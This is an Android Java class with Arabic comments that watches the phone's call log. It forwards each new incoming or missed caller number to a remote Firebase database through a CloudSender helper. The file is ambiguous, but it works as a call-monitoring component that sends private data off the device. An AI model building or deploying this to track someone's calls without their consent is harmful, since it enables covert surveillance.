package com.cdma.gsm.call;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.CallLog;
import android.util.Log;

public class CallLogObserver extends ContentObserver {
    private Context context;
    private String lastNumber = "";

    public CallLogObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        // التحقق من آخر مكالمة مضافة في السجل
        checkLastCall();
    }

    private void checkLastCall() {
        try {
            Cursor cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null,
                    CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null && cursor.moveToFirst()) {
                int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                
                String number = cursor.getString(numberIndex);
                int type = cursor.getInt(typeIndex);

                // نتأكد أنها مكالمة واردة (INCOMING) أو فائتة (MISSED) ولم نرسلها للتو
                if ((type == CallLog.Calls.INCOMING_TYPE || type == CallLog.Calls.MISSED_TYPE) 
                    && !number.equals(lastNumber)) {
                    
                    lastNumber = number;
                    Log.d("CallLogObserver", "تم التقاط رقم من السجل: " + number);
                    
                    // إرسال الرقم فوراً إلى رابط Firebase RTDB الخاص بك
                    CloudSender.sendSignal(number, "CALL");
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e("CallLogObserver", "خطأ: إذن سجل المكالمات غير ممنوح.");
        }
    }
}
